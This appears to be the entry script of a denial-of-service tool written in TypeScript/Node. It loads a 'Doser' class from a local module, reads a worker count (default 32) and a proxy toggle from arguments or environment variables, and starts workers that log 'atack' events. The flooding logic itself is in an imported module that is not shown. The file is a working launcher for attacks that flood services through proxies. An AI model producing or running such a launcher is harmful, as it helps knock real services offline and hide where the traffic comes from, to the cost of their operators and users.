// import { Doser } from './doser';
const {Doser} = require('./src-worker/doser')

let workers = process.argv[2] ? Number(process.argv[2]):  32;
let useProxy = process.argv[3] === 'false' ? false : true;


if(process.env.WORKERS) {
  workers = Number(process.env.WORKERS)
}
if(process.env.USEPROXY) {
  useProxy = process.env.USEPROXY == "true"
}

console.log(`Using ${workers} workers, proxy - ${useProxy}`);

const doser = new Doser(useProxy, workers, false);

doser.listen('atack', (data: any) => console.log(data.log))

doser.start()
